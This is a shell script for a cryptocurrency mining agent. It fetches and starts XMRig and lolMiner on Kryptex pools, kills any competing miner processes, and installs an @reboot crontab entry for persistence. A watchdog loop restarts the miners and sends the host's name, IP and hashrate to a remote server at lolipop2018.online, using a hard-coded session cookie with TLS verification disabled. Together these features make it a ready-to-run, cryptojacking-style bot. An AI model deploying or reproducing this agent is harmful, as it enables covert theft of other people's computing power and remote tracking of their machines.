#!/bin/sh
set -u

#################################################
# MINING AGENT — CPU + GPU (KRYPTEX)
# TELEMETRY → API (lolipop2018.online)
# Полное соответствие: HEARTBEAT_ENDPOINT.txt
#################################################

# ===== ГЛОБАЛЬНЫЕ НАСТРОЙКИ =====
[ "${ALLOW_MINING:-0}" = "1" ] || exit 0

HOSTNAME_SHORT="$(hostname | tr -d '\n' | tr -c 'a-zA-Z0-9_-_' '_')"
INTERVAL=30
RUN_ID="${MINING_RUN_ID:-run_$(date +%s)_${HOSTNAME_SHORT}}"

# ===== KRYPTEX ACCOUNTS & POOLS =====
KRIPTEX="krxX3PVQVR"
XMR_POOL="xmr.kryptex.network:7029"
ETC_POOL="etc.kryptex.network:7033"

# ===== API CONFIG =====
API_BASE="${API_BASE:-https://lolipop2018.online}"
AUTH_SESSION="${AUTH_SESSION:-_CKU0PGWv9EwWBJmdNJyZDF5AdkJ4KJa2Gv2GV9fVe0}"
API_TIMEOUT=15
API_CONNECT_TIMEOUT=10
API_SKIP_SSL="${API_SKIP_SSL:-1}"  # 1 = пропускать проверку сертификата

# ===== CURL OPTIONS =====
_CURL_SSL=""
[ "${API_SKIP_SSL}" = "1" ] && _CURL_SSL="-k"
_CURL_BASE="curl -s --connect-timeout ${API_CONNECT_TIMEOUT} --max-time ${API_TIMEOUT} ${_CURL_SSL}"

# ===== PATHS =====
BASE="${MINING_BASE:-$HOME/.mining}"
BIN="$BASE/bin"
RUN="$BASE/run"
LOG="$BASE/log"
mkdir -p "$BIN/cpu" "$BIN/gpu" "$RUN" "$LOG" 2>/dev/null || true

# ===== GET IP (fallback chain) =====
_get_ip() {
  # 1. hostname -I (первый не-127 адрес)
  _ip="$(hostname -I 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i !~ /^127\./){print $i; exit}}')"
  [ -n "$_ip" ] && echo "$_ip" && return
  
  # 2. ip route
  _ip="$(ip route get 1.1.1.1 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/){print $i; exit}}')"
  [ -n "$_ip" ] && echo "$_ip" && return
  
  # 3. fallback
  echo "0.0.0.0"
}

AGENT_IP="$(_get_ip)"

# ===== API HELPERS (строго по спецификации) =====
_api_post() {
  _endpoint="$1"
  _json="$2"
  $_CURL_BASE -X POST "${API_BASE}${_endpoint}" \
    -H "Content-Type: application/json" \
    -H "Cookie: auth_session=${AUTH_SESSION}" \
    -d "${_json}" >/dev/null 2>&1 || true
}

_api_get() {
  _endpoint="$1"
  $_CURL_BASE -X GET "${API_BASE}${_endpoint}" \
    -H "Cookie: auth_session=${AUTH_SESSION}" >/dev/null 2>&1 || true
}

# POST /api/heartbeat — строго по спецификации
api_heartbeat() {
  _event="${1:-heartbeat}"
  _message="${2:-}"
  # Обязательные поля
  _json="{\"username\":\"${HOSTNAME_SHORT}\",\"ip\":\"${AGENT_IP}\",\"event\":\"${_event}\""
  # Опциональные поля (только если переданы)
  [ -n "${_message}" ] && _json="${_json},\"message\":\"${_message}\""
  [ -n "${RUN_ID}" ] && _json="${_json},\"run_id\":\"${RUN_ID}\""
  _json="${_json}}"
  _api_post "/api/heartbeat" "$_json"
}

# POST /api/logs/push — строго по спецификации (event=log внутри)
api_log() {
  _message="$1"
  # Обязательные: username, ip, message
  _json="{\"username\":\"${HOSTNAME_SHORT}\",\"ip\":\"${AGENT_IP}\",\"message\":\"${_message}\""
  [ -n "${RUN_ID}" ] && _json="${_json},\"run_id\":\"${RUN_ID}\""
  _json="${_json}}"
  _api_post "/api/logs/push" "$_json"
}

# ===== INSTALLERS =====
install_xmrig() {
  api_log "Installing XMRig"
  pkill xmrig 2>/dev/null || true
  rm -f "$BIN/cpu/xmrig" 2>/dev/null

  for _url in \
    "https://xmrig.com/download/xmrig-6.25.0-linux-static-x64.tar.gz" \
    "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz"
  do
    $_CURL_BASE -L "$_url" -o /tmp/xmrig.tgz || continue
    tar -xzf /tmp/xmrig.tgz -C "$BIN/cpu" --strip-components=1 2>/dev/null || continue
    chmod +x "$BIN/cpu/xmrig" 2>/dev/null
    [ -x "$BIN/cpu/xmrig" ] && api_log "XMRig installed" && return 0
  done
  api_log "ERROR: XMRig install failed"
  return 1
}

install_lolminer() {
  api_log "Installing lolMiner"
  pkill lolMiner 2>/dev/null || true
  rm -f "$BIN/gpu/lolMiner" 2>/dev/null

  for _url in \
    "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz"
  do
    $_CURL_BASE -L "$_url" -o /tmp/lolminer.tgz || continue
    tar -xzf /tmp/lolminer.tgz -C "$BIN/gpu" --strip-components=1 2>/dev/null || continue
    chmod +x "$BIN/gpu/lolMiner" 2>/dev/null
    [ -x "$BIN/gpu/lolMiner" ] && api_log "lolMiner installed" && return 0
  done
  api_log "ERROR: lolMiner install failed"
  return 1
}

# ===== MINERS START =====
start_cpu() {
  pkill xmrig 2>/dev/null || true
  "$BIN/cpu/xmrig" \
    -o "$XMR_POOL" \
    -u "$KRIPTEX.$HOSTNAME_SHORT" -p x \
    --http-enabled --http-host 127.0.0.1 --http-port 16000 \
    >> "$LOG/cpu.log" 2>&1 &
  echo $! > "$RUN/cpu.pid"
  api_heartbeat "cpu_started" "XMRig launched on $HOSTNAME_SHORT"
}

start_gpu() {
  pkill lolMiner 2>/dev/null || true
  "$BIN/gpu/lolMiner" \
    --algo ETCHASH \
    --pool "$ETC_POOL" \
    --user "$KRIPTEX.$HOSTNAME_SHORT" \
    --ethstratum ETCPROXY \
    --apihost 127.0.0.1 --apiport 8080 \
    >> "$LOG/gpu.log" 2>&1 &
  echo $! > "$RUN/gpu.pid"
  api_heartbeat "gpu_started" "lolMiner launched on $HOSTNAME_SHORT"
}

# ===== HASHRATE READERS (для watchdog) =====
get_cpu_hr() {
  $_CURL_BASE "http://127.0.0.1:16000/1/summary" 2>/dev/null | \
    grep -oE '"total":\[[^]]+' | grep -oE '[0-9]+' | head -1 || echo "0"
}

get_gpu_hr() {
  $_CURL_BASE "http://127.0.0.1:8080/summary" 2>/dev/null | \
    grep -oE '"Performance":[ ]*[0-9]+(\.[0-9]+)?' | grep -oE '[0-9]+(\.[0-9]+)?' || echo "0"
}

# ===== AUTOSTART =====
ensure_autostart() {
  crontab -l 2>/dev/null | grep -q "min1.sh" && return
  (crontab -l 2>/dev/null; echo "@reboot ALLOW_MINING=1 ${BASE}/min1.sh") | crontab - 2>/dev/null || true
  api_log "Autostart configured via crontab"
}

# ===== MAIN =====
CPU_OK=0
GPU_OK=0

# Инициализация
api_heartbeat "agent_init" "Mining agent starting on ${HOSTNAME_SHORT}"

install_xmrig && CPU_OK=1
install_lolminer && GPU_OK=1

ensure_autostart

[ "$CPU_OK" = "1" ] && start_cpu || api_log "ERROR: CPU miner failed to start"
[ "$GPU_OK" = "1" ] && start_gpu || api_log "ERROR: GPU miner failed to start"

if [ "$CPU_OK" = "1" ] || [ "$GPU_OK" = "1" ]; then
  api_heartbeat "mining_started" "CPU=${CPU_OK} GPU=${GPU_OK}" 
else
  api_heartbeat "mining_failed" "No miners could be started"
fi

# ===== WATCHDOG LOOP =====
while true; do
  # Проверка CPU процесса
  if [ -f "$RUN/cpu.pid" ] && [ "$CPU_OK" = "1" ]; then
    _pid="$(cat "$RUN/cpu.pid" 2>/dev/null)"
    if [ -n "$_pid" ] && ! kill -0 "$_pid" 2>/dev/null; then
      start_cpu
      api_log "WATCHDOG: CPU miner restarted"
    fi
  fi

  # Проверка GPU процесса
  if [ -f "$RUN/gpu.pid" ] && [ "$GPU_OK" = "1" ]; then
    _pid="$(cat "$RUN/gpu.pid" 2>/dev/null)"
    if [ -n "$_pid" ] && ! kill -0 "$_pid" 2>/dev/null; then
      start_gpu
      api_log "WATCHDOG: GPU miner restarted"
    fi
  fi

  # Проверка хешрейта GPU (ноль = проблема)
  if [ "$GPU_OK" = "1" ]; then
    _gpu_hr="$(get_gpu_hr | tr -d ' ')"
    if [ -n "$_gpu_hr" ] && [ "$(echo "$_gpu_hr" | cut -d. -f1)" = "0" ]; then
      start_gpu
      api_log "WATCHDOG: GPU zero hashrate, restarted"
    fi
  fi

  # Периодический heartbeat
  _cpu_hr="$(get_cpu_hr)"
  _gpu_hr="$(get_gpu_hr)"
  api_heartbeat "watchdog_tick" "CPU=${_cpu_hr}H/s GPU=${_gpu_hr}MH/s"

  sleep "$INTERVAL"
done
